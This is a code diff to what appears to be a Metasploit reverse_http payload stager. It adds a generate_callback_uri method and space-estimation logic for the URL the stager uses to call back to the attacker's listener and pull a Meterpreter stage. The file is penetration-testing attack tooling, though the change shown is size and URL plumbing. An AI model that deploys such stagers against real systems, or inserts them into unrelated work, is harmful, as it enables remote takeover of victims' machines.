@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
-  CachedSize = 442
+  CachedSize = 446
 
   include Msf::Payload::Stager
 
@@ -50,7 +50,7 @@ module Metasploit3
     target_url << ':'
     target_url << datastore['LPORT'].to_s
     target_url << '/'
-    target_url << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP)
+    target_url << generate_callback_uri
 
     proxy_host = datastore['PayloadProxyHost'].to_s
     proxy_port = datastore['PayloadProxyPort'].to_i
@@ -77,4 +77,36 @@ module Metasploit3
     b64_stub << "')))"
     return b64_stub
   end
+
+  #
+  # Determine the maximum amount of space required for the features requested
+  #
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
+
+    # Add 100 bytes for the encoder to have some room
+    space += 100
+
+    # Make room for the maximum possible URL length
+    space += 256
+
+    # The final estimated size
+    space
+  end
+
+  #
+  # Return the longest URL that fits into our available space
+  #
+  def generate_callback_uri
+    uri_req_len = 30 + rand(256-30)
+
+    # Generate the short default URL if we don't have enough space
+    if self.available_space.nil? || required_space > self.available_space
+      uri_req_len = 5
+    end
+
+    generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP, uri_req_len)
+  end
+
 end
